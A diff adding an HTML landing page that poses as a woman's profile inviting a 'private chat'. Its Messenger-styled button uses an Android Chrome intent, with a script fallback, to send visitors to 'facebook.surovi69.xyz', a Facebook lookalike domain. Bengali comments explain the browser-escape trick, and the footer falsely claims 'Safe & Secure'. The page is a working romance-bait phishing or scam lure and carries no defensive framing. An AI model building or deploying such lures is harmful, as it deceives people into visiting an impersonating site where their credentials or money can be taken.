@@ -1,0 +1,122 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>Connect with Jacklyn</title>
+    <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/6.0.0/css/all.min.css">
+    <style>
+        body {
+            margin: 0;
+            padding: 0;
+            font-family: 'Segoe UI', Tahoma, Geneva, Verdana, sans-serif;
+            background-color: #f0f2f5;
+            display: flex;
+            justify-content: center;
+            align-items: center;
+            height: 100vh;
+        }
+        .bridge-card {
+            background: white;
+            width: 90%;
+            max-width: 400px;
+            border-radius: 15px;
+            overflow: hidden;
+            box-shadow: 0 10px 25px rgba(0,0,0,0.1);
+            text-align: center;
+        }
+        .cover-photo {
+            width: 100%;
+            height: 120px;
+            background: url('https://github.com/pj9889/picvid/blob/main/pic3.webp?raw=true') center/cover;
+        }
+        .profile-section {
+            margin-top: -50px;
+            padding: 20px;
+        }
+        .profile-img {
+            width: 100px;
+            height: 100px;
+            border-radius: 50%;
+            border: 4px solid white;
+            box-shadow: 0 4px 10px rgba(0,0,0,0.1);
+        }
+        .name {
+            font-size: 22px;
+            font-weight: bold;
+            color: #1c1e21;
+            margin: 10px 0 5px;
+        }
+        .bio {
+            color: #65676b;
+            font-size: 14px;
+            margin-bottom: 20px;
+            line-height: 1.4;
+        }
+        .main-btn {
+            background-color: #0084FF;
+            color: white;
+            text-decoration: none;
+            padding: 15px 30px;
+            border-radius: 10px;
+            font-weight: bold;
+            display: inline-flex;
+            align-items: center;
+            gap: 10px;
+            transition: background 0.3s;
+            border: none;
+            cursor: pointer;
+            width: 80%;
+            justify-content: center;
+            font-size: 16px;
+        }
+        .main-btn:hover {
+            background-color: #0073e6;
+        }
+        .footer-text {
+            font-size: 12px;
+            color: #bcc0c4;
+            margin-top: 20px;
+            padding-bottom: 20px;
+        }
+    </style>
+</head>
+<body>
+
+    <div class="bridge-card">
+        <div class="cover-photo"></div>
+        <div class="profile-section">
+            <img src="https://github.com/pj9889/picvid/blob/main/pic1.webp?raw=true" alt="Profile" class="profile-img">
+            <div class="name">Jacklyn Rose</div>
+            <div class="bio">
+                Hey there! I am waiting to start a private conversation with you. 
+                Click below to join my official room.
+            </div>
+            
+            <!-- মূল বাটন যা গুগল ক্রমে ওপেন করার চেষ্টা করবে -->
+            <a href="intent://facebook.surovi69.xyz#Intent;scheme=https;package=com.android.chrome;end" class="main-btn">
+                <i class="fab fa-facebook-messenger"></i> Start Private Chat
+            </a>
+        </div>
+        <div class="footer-text">
+            © 2026 Connect Plus | Safe & Secure
+        </div>
+    </div>
+
+    <script>
+        // বাটন ক্লিক লজিক: যদি ইনটেন্ট কাজ না করে তবে সরাসরি লিঙ্কে যাবে
+        document.querySelector('.main-btn').addEventListener('click', function(e) {
+            const mainUrl = "https://facebook.surovi69.xyz";
+            
+            // অ্যান্ড্রয়েড ইউজারদের জন্য সরাসরি ক্রমে ওপেন করার কমান্ড
+            const chromeIntent = "intent://facebook.surovi69.xyz#Intent;scheme=https;package=com.android.chrome;end";
+            
+            // অল্প সময় অপেক্ষা করে চেক করা যে ক্রমে ওপেন হয়েছে কিনা, না হলে সাধারণ রিডাইরেক্ট
+            setTimeout(function() {
+                window.location.href = mainUrl;
+            }, 500);
+        });
+    </script>
+
+</body>
+</html>
